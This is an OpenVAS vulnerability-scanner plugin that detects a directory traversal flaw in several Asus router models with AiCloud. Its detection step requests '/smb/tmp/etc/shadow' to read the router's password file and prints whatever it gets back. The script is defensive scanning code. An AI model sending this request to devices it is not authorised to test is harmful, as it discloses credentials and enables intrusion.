###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asus_rt_aicloud_dir_traversal_6_13.nasl 6104 2017-05-11 09:03:48Z teissa $
#
# Multiple Asus Router Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The remote Asus router is prone to a directory traversal
vulnerability.";

tag_affected = 'Vulnerable Asus Models
RT-AC66R   Dual-Band Wireless-AC1750 Gigabit Router
RT-AC66U   Dual-Band Wireless-AC1750 Gigabit Router
RT-N66R     Dual-Band Wireless-N900 Gigabit Router with 4-Port Ethernet Switch
RT-N66U     Dual-Band Wireless-N900 Gigabit Router
RT-AC56U   Dual-Band Wireless-AC1200 Gigabit Router
RT-N56R     Dual-Band Wireless-AC1200 Gigabit Router
RT-N56U     Dual-Band Wireless-AC1200 Gigabit Router
RT-N14U     Wireless-N300 Cloud Router
RT-N16       Wireless-N300 Gigabit Router
RT-N16R     Wireless-N300 Gigabit Router';

tag_solution = "Turn off AiCloud service.";
tag_impact = "Disclosure of cleartext passwords.";
tag_vuldetect = 'Try to read /etc/shadow.';

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103747";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 6104 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_name("Multiple Asus Router Directory Traversal Vulnerability");
 script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/asus-rt-n66u-directory-traversal");
 script_xref(name:"URL", value:"http://heise.de/-2105778");
 script_tag(name:"last_modification", value:"$Date: 2017-05-11 11:03:48 +0200 (Thu, 11 May 2017) $");
 script_tag(name:"creation_date", value:"2013-06-26 13:46:49 +0200 (Wed, 26 Jun 2013)");

 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("RT-Device/banner");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "affected" , value : tag_affected);
 script_tag(name : "impact" , value : tag_impact);

 exit(0);
}

include("http_func.inc");

port = get_http_port( default:8080 );
if( ! get_port_state( port ) )exit(0);

banner = get_http_banner( port:port );

if( banner !~ 'Basic realm="RT-' ) exit( 0 );

ssl_port = 443;
if( ! get_port_state( ssl_port ) ) exit( 99 );

soc = open_sock_tcp( ssl_port );
if( ! soc ) exit( 0 );

url = '/smb/tmp/etc/shadow';

req = http_get( item:url, port:ssl_port );
send( socket:soc, data:req );

while( buf = recv( socket:soc, length:512 ) )
{
  recv += buf;
}  

close( soc );

if( egrep( pattern:"(nas|admin|nobody):.*:0:[01]:.*:", string:recv ) )
{
  report =  '\n\nBy requesting the URL "/smb/tmp/etc/shadow" we received the following response:\n\n' + recv + '\n';

  security_message( port:ssl_port, data:report );
  exit(0);
}  

exit( 99 );
